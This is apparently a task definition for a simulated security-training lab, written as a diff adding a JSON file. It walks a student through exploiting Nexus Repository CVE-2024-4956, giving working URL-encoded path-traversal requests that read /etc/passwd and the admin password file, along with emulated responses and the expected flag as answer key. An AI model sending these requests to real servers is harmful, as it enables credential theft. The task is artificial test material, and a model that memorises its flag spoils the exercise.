@@ -1,0 +1,47 @@
+{
+  "id": "web-nexus",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{n3xus_tr4v3rs4l_adm1n_p4ssw0rd}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: Nexus CVE-2024-4956\n\nЦель: `http://nexus.local:8081`.\n\n1. Версия:\n   curl -s http://nexus.local:8081/service/rest/v1/status/check\n\n2. Проверь traversal — прочитай безобидный файл:\n   curl -s 'http://nexus.local:8081/repository/..%2f..%2f..%2f..%2f..%2fetc/passwd'\n\n3. Дочитай до пароля админа:\n   curl -s 'http://nexus.local:8081/repository/..%2f..%2f..%2f..%2f..%2fnexus-data/admin.password'\n\n4. В файле — строка с флагом. Сохрани в found.txt и набери `check`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция nexus.local)",
+      "cases": [
+        {
+          "match": "admin\\.password",
+          "example": "-s 'http://nexus.local:8081/repository/..%2f..%2f..%2f..%2f..%2fnexus-data/admin.password'",
+          "output": "a1b2c3d4-initial-admin-password-nto{n3xus_tr4v3rs4l_adm1n_p4ssw0rd}\n"
+        },
+        {
+          "match": "etc/passwd",
+          "example": "-s 'http://nexus.local:8081/repository/..%2f..%2f..%2f..%2f..%2fetc/passwd'",
+          "output": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
+        },
+        {
+          "match": "status/check",
+          "example": "-s http://nexus.local:8081/service/rest/v1/status/check",
+          "output": "{\"healthy\":true,\"version\":\"3.68.0\"}\n"
+        },
+        {
+          "match": "status",
+          "example": "-s http://nexus.local:8081/service/rest/v1/status",
+          "output": "{\"version\":\"3.68.0\",\"edition\":\"OSS\"}\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только nexus.local"
+    }
+  }
+}
